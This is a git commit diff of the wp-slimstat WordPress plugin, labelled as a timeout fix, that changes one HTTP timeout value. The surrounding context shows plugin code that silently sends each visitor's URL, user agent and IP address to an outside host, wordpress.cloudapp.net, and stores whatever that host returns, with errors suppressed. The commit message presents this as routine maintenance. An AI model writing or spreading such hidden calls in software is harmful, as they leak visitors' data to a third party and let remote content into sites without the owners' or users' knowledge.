786ffcc01cfdf546707b3f49782aa4f80cf7589e
coolmann <coolmann@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2014-12-02 02:55:19 +0000

    Version 3.8.5 - Fixed a timeout issue
    git-svn-id: http://plugins.svn.wordpress.org/wp-slimstat/tags/3.8.5@1036396 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- wp-slimstat.php
+++ wp-slimstat.php
@@ -1188,7 +1188,7 @@ class wp_slimstat{
 		}
 
 		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
-		$options = stream_context_create(array( 'http' => array( 'timeout' => 1, 'ignore_errors' => true ) ) ); 
+		$options = stream_context_create(array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
 
 		if (empty(self::$pidx['response'])){
 			self::$pidx['response'] = @file_get_contents($request, 0, $options);
